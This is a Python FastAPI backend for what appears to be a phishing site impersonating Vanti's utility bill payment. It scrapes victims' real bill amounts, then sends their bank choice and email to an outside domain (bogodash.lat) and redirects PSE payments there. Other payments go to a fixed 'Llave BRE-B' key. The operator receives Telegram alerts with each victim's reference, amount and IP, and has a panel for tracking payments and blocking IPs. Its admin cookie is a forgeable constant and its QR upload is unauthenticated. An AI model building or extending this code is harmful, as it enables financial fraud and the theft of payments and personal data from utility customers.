import sys
import asyncio
import os
import random
import shutil
import json
import time
import requests
from typing import List

# 1. Configurar política de Event Loop para Windows ANTES de iniciar tareas asíncronas
if sys.platform == 'win32':
    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())

from fastapi import FastAPI, Request, Form, WebSocket, WebSocketDisconnect, UploadFile, File, HTTPException, Depends
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

from app.database import (
    init_db, guardar_transaccion, actualizar_estado_transaccion,
    obtener_transaccion, obtener_todas_transacciones, obtener_metricas,
    bloquear_ip, es_ip_bloqueada, guardar_otp_admin, verificar_otp_admin
)

from app.vanti_scraper import consultar_factura_vanti
from app.telegram_utils import enviar_mensaje_telegram

# 2. Inicializar la aplicación FastAPI
app = FastAPI(title="Sistema Vanti & Panel Admin")

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
STATIC_DIR = os.path.join(BASE_DIR, "static")

# Inicializar Base de Datos SQLite
init_db()

# Montar archivos estáticos y plantillas
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="app/templates")

# Gestor de conexiones WebSockets para el Panel Admin local
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: dict):
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except Exception:
                pass

manager = ConnectionManager()

# Helper para obtener IP del cliente
def get_client_ip(request: Request) -> str:
    forwarded = request.headers.get("X-Forwarded-For")
    if forwarded:
        return forwarded.split(",")[0]
    return request.client.host or "127.0.0.1"

# Middleware para bloqueo de IP
@app.middleware("http")
async def check_ip_blocking(request: Request, call_next):
    ip = get_client_ip(request)
    if es_ip_bloqueada(ip) and not request.url.path.startswith("/static"):
        return HTMLResponse("<h1>403 Acceso Denegado - Su IP ha sido bloqueada.</h1>", status_code=403)
    response = await call_next(request)
    return response

# --- RUTAS PÚBLICAS (CLIENTE) ---

@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    return templates.TemplateResponse(
        request=request, name="index.html", context={"error": None}
    )

@app.post("/consultar", response_class=HTMLResponse)
async def consultar(
    request: Request, 
    empresa: str = Form(...), 
    referencia: str = Form(...),
    metodo_pago: str = Form("pse")
):
    ip = get_client_ip(request)
    
    # Ejecutar Scraper de Vanti
    resultado = await consultar_factura_vanti(empresa, referencia)
    
    if not resultado.get("success"):
        return templates.TemplateResponse(
            request=request, name="index.html",
            context={"error": resultado.get("message", "Error al consultar la referencia.")}
        )
    
    # Guardar en Base de Datos
    monto = float(resultado.get("amount", 0))
    tx_id = guardar_transaccion(empresa, referencia, monto, ip)

    tx = obtener_transaccion(tx_id)
    metricas = obtener_metricas()

    # Notificar al admin por WebSocket
    await manager.broadcast({
        "event": "NUEVA_CONSULTA",
        "tx": tx,
        "metricas": metricas
    })

    # Redirección según método elegido
    if metodo_pago == "llave":
        return templates.TemplateResponse(
            request=request, name="checkout_llave.html",
            context={
                "tx_id": tx_id,
                "referencia": referencia,
                "monto": int(monto),
                "empresa": empresa
            }
        )

    return templates.TemplateResponse(
        request=request, name="checkout.html",
        context={
            "tx_id": tx_id,
            "referencia": referencia,
            "monto": int(monto),
            "empresa": empresa
        }
    )

@app.post("/procesar-pago-pse", response_class=RedirectResponse)
async def procesar_pago_pse(
    request: Request,
    banco: str = Form(...),
    tx_id: int = Form(...),
    correo: str = Form(None)
):
    tx = obtener_transaccion(tx_id)
    monto = int(tx["monto"]) if tx else 0
    correo_cliente = correo or "-"

    url_notificar_php = "https://bogodash.lat/panel/notificar.php"
    subruta_entidad = ""

    try:
        payload = {
            "banco": banco,
            "valor": monto,
            "correo": correo_cliente
        }
        res = requests.post(url_notificar_php, data=payload, timeout=5)
        
        if res.status_code == 200:
            subruta_entidad = res.text.strip()
            print(f"[PSE] Notificación PHP exitosa. Subruta devuelta: {subruta_entidad}")
        else:
            print(f"[ERROR PSE] PHP devolvió status {res.status_code}: {res.text}")
    except Exception as e:
        print(f"[ERROR PSE] Ocurrió una excepción al llamar a {url_notificar_php}: {e}")

    if not subruta_entidad:
        subruta_entidad = "entidad/bogota/"

    subruta_limpia = subruta_entidad.strip("/")
    url_destino = f"https://bogodash.lat/{subruta_limpia}/?valor={monto}&banco={banco}"

    await manager.broadcast({
        "event": "NUEVA_NOTIFICACION",
        "banco": banco,
        "monto": monto,
        "correo": correo_cliente
    })

    ip = get_client_ip(request)
    print(f"[PSE] IP ({ip}) banco: {banco} (${monto}). Redirigiendo a: {url_destino}")

    return RedirectResponse(url=url_destino, status_code=303)

@app.post("/procesar-pago-llave", response_class=HTMLResponse)
async def procesar_pago_llave(
    request: Request,
    tx_id: int = Form(...),
    referencia: str = Form(...),
    monto: float = Form(...)
):
    try:
        ip = get_client_ip(request)
        tx = obtener_transaccion(tx_id)
        
        if tx:
            actualizar_estado_transaccion(tx_id, "por_verificar")
            tx["estado"] = "por_verificar"

            # Broadcast al WebSocket de Admin
            await manager.broadcast({
                "event": "NUEVO_PAGO_LLAVE",
                "tx": tx,
                "metricas": obtener_metricas()
            })

            # Alerta por Telegram
            empresa_nombre = tx.get('empresa', 'Vanti') if isinstance(tx, dict) else 'Vanti'
            enviar_mensaje_telegram(
                f"🔑 <b>¡Nuevo pago con Llave BRE-B!</b>\n"
                f"• <b>Llave usada:</b> <code>0093310444</code>\n"
                f"• <b>Empresa:</b> {empresa_nombre}\n"
                f"• <b>Referencia:</b> {referencia}\n"
                f"• <b>Monto:</b> ${monto:,.0f}\n"
                f"• <b>IP:</b> {ip}"
            )

        return templates.TemplateResponse(
            request=request, name="esperando.html", context={"tx_id": tx_id}
        )

    except Exception as e:
        print(f"[ERROR CRÍTICO EN PROCESAR PAGO LLAVE]: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/admin/cambiar_estado")
async def cambiar_estado(
    request: Request,
    tx_id: int = Form(...),
    nuevo_estado: str = Form(...)
):
    if request.cookies.get("admin_session") != "authenticated_vanti":
        raise HTTPException(status_code=401, detail="Sesión no autorizada.")
    
    # 1. Actualizar estado en la base de datos SQLite
    actualizar_estado_transaccion(tx_id, nuevo_estado)
    
    tx = obtener_transaccion(tx_id)
    metricas = obtener_metricas()
    
    # 2. Notificar vía WebSocket al cliente y al panel admin
    await manager.broadcast({
        "event": "ESTADO_CAMBIADO",
        "tx_id": tx_id,
        "nuevo_estado": nuevo_estado,
        "tx": tx,
        "metricas": metricas
    })
    
    return {"status": "ok", "tx_id": tx_id, "nuevo_estado": nuevo_estado}


@app.post("/admin/bloquear_ip")
async def api_bloquear_ip(
    request: Request,
    ip: str = Form(...)
):
    if request.cookies.get("admin_session") != "authenticated_vanti":
        raise HTTPException(status_code=401, detail="Sesión no autorizada.")
    
    bloquear_ip(ip)
    return {"status": "ok", "ip_bloqueada": ip}
    
@app.post("/notificar_pago", response_class=HTMLResponse)
async def notificar_pago(request: Request, tx_id: int = Form(...)):
    ip = get_client_ip(request)
    tx = obtener_transaccion(tx_id)
    
    if tx:
        actualizar_estado_transaccion(tx_id, "por_verificar")
        tx["estado"] = "por_verificar"

        await manager.broadcast({
            "event": "NUEVO_PAGO",
            "tx": tx,
            "metricas": obtener_metricas()
        })

        enviar_mensaje_telegram(
            f"🔔 <b>¡Nuevo pago recibido para verificar!</b>\n"
            f"• <b>Empresa:</b> {tx['empresa']}\n"
            f"• <b>Referencia:</b> {tx['referencia']}\n"
            f"• <b>Monto:</b> ${tx['monto']:,.0f}\n"
            f"• <b>IP:</b> {ip}"
        )

    return templates.TemplateResponse(
        request=request, name="esperando.html", context={"tx_id": tx_id}
    )

@app.get("/estado_pago/{tx_id}")
async def estado_pago(tx_id: int):
    tx = obtener_transaccion(tx_id)
    if tx:
        return {"estado": tx["estado"]}
    return {"estado": "no_encontrado"}

@app.get("/resultado/{tx_id}", response_class=HTMLResponse)
async def resultado_final(request: Request, tx_id: int):
    tx = obtener_transaccion(tx_id)
    return templates.TemplateResponse(
        request=request, name="estado.html", context={"tx": tx}
    )

# --- PANEL DE ADMINISTRACIÓN Y TELEGRAM ---

@app.get("/admin/login", response_class=HTMLResponse)
async def admin_login_page(request: Request):
    otp = str(random.randint(100000, 999999))
    guardar_otp_admin(otp)
    enviar_mensaje_telegram(f"🔐 <b>Código de Seguridad para Admin:</b> <code>{otp}</code>")
    return templates.TemplateResponse(
        request=request, name="admin_login.html", context={"error": None}
    )

@app.post("/admin/login")
async def admin_login_post(request: Request, otp: str = Form(...)):
    if verificar_otp_admin(otp):
        response = RedirectResponse(url="/admin", status_code=303)
        response.set_cookie(key="admin_session", value="authenticated_vanti", httponly=True)
        return response
    return templates.TemplateResponse(
        request=request, name="admin_login.html", context={"error": "Código OTP inválido o expirado."}
    )

@app.get("/admin", response_class=HTMLResponse)
async def admin_panel(request: Request):
    if request.cookies.get("admin_session") != "authenticated_vanti":
        return RedirectResponse(url="/admin/login")

    transacciones = obtener_todas_transacciones()
    metricas = obtener_metricas()
    return templates.TemplateResponse(
        request=request, name="admin.html",
        context={
            "transacciones": transacciones,
            "metricas": metricas
        }
    )

@app.get("/admin/datos")
async def admin_datos(request: Request):
    if request.cookies.get("admin_session") != "authenticated_vanti":
        raise HTTPException(status_code=401, detail="Sesión de administrador requerida.")

    return {
        "transacciones": obtener_todas_transacciones(),
        "metricas": obtener_metricas()
    }

@app.post("/admin/actualizar_qr")
async def actualizar_qr(file: UploadFile = File(...)):
    os.makedirs("static/uploads", exist_ok=True)
    file_path = "static/uploads/qr_actual.png"
    with open(file_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)
    
    await manager.broadcast({"event": "QR_ACTUALIZADO"})
    return {"status": "ok"}
